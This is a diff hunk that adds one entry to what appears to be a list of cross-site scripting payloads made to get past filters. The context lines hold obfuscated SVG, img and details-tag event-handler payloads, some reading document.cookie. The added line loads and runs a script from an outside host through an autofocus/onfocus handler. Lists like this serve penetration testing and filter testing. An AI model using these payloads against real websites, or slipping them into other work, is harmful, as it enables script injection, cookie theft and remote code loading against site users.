@@ -134,6 +134,7 @@ confirm?.(1)
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
 <Svg OnLoad= location=textContent>JavaS<a>cript:al<a>ert(<a>1)// Template Literals: <Svg OnLoad= location=`Java${/S/.source}cript:alert${"\50"}1)`>
 <img alt="<x" title="/><img src=x onerror=alert(6)>">
+1"><A HRef=%26quot AutoFocus OnFocus%0C={import(/https:http://X55.is/.source)}>
 <!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>
 "><?/script>"><--<img+src= "><svg/onload?=alert(document.cookie)>> --!>
 "-->""/>0xr3dhunt</script><deTailS open x=">" ontoggle=(co\u006efirm)``>"
